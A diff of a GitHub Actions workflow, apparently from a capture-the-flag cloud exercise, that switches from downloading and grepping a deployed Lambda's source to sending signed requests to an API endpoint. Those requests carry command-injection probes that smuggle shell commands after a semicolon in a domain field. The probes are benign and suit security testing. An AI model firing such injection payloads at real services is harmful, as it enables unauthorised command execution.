@@ -1,4 +1,4 @@
-name: Stage2-05-Download-Lambda
+name: Stage2-06-Domain-Injection-Test
 
 on:
   push:
@@ -7,54 +7,68 @@ on:
 
 permissions:
   contents: read
-  id-token: write
 
 jobs:
-  inspect:
+  test:
     runs-on: ubuntu-latest
 
+    env:
+      AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
+      AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
+      AWS_SESSION_TOKEN: ${{ secrets.AWS_SESSION_TOKEN }}
+      API_URL: https://l8ssyaz69f.execute-api.us-east-1.amazonaws.com/dev/code_exec
+
     steps:
-      - name: Configure AWS credentials
-        uses: aws-actions/configure-aws-credentials@v4
-        with:
-          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
-          aws-region: us-east-1
-
-      - name: Identify Lambda
+      - name: Install dependencies
         run: |
-          aws sts get-caller-identity
-          aws lambda get-function-configuration \
-            --function-name nslookupv2 \
-            --query '{FunctionName:FunctionName,Role:Role,Runtime:Runtime,Handler:Handler,Layers:Layers,VpcConfig:VpcConfig}' \
-            --output json
+          python3 -m pip install requests requests-aws4auth --quiet
 
-      - name: Download deployed Lambda package
+      - name: Test domain event path
         run: |
-          URL=$(aws lambda get-function \
-            --function-name nslookupv2 \
-            --query 'Code.Location' \
-            --output text)
+          python3 - <<'PY'
+          import os
+          import requests
+          from requests_aws4auth import AWS4Auth
 
-          curl --fail --location "$URL" --output /tmp/nslookupv2.zip
+          auth = AWS4Auth(
+              os.environ["AWS_ACCESS_KEY_ID"],
+              os.environ["AWS_SECRET_ACCESS_KEY"],
+              "us-east-1",
+              "execute-api",
+              session_token=os.environ["AWS_SESSION_TOKEN"]
+          )
 
-          mkdir -p /tmp/nslookupv2
-          unzip -l /tmp/nslookupv2.zip
-          unzip -q /tmp/nslookupv2.zip -d /tmp/nslookupv2
+          tests = [
+              {
+                  "name": "normal_domain",
+                  "body": {
+                      "domain": "example.com"
+                  }
+              },
+              {
+                  "name": "safe_injection_probe",
+                  "body": {
+                      "domain": "example.com; printf CTF_PROBE"
+                  }
+              },
+              {
+                  "name": "path_probe",
+                  "body": {
+                      "domain": "example.com; test -x /opt/nslookup"
+                  }
+              }
+          ]
 
-      - name: Inspect deployed source
-        run: |
-          find /tmp/nslookupv2 -maxdepth 3 -type f -print
+          for test in tests:
+              response = requests.post(
+                  os.environ["API_URL"],
+                  json=test["body"],
+                  auth=auth,
+                  timeout=40
+              )
 
-          echo "===== Python source files ====="
-          find /tmp/nslookupv2 -type f -name '*.py' -exec sh -c '
-            for file do
-              echo "===== $file ====="
-              sed -n "1,240p" "$file"
-            done
-          ' sh {} +
-
-      - name: Search deployed package
-        run: |
-          rg -n -i \
-            "subprocess|shell=True|nslookup|s3|bucket|user.?agent|sourcevpc|sourcevpce|flag|secret|exec|base64|lambda_handler" \
-            /tmp/nslookupv2 || true
+              print(f"TEST={test['name']}")
+              print(f"HTTP={response.status_code}")
+              print(response.text)
+              print("---")
+          PY
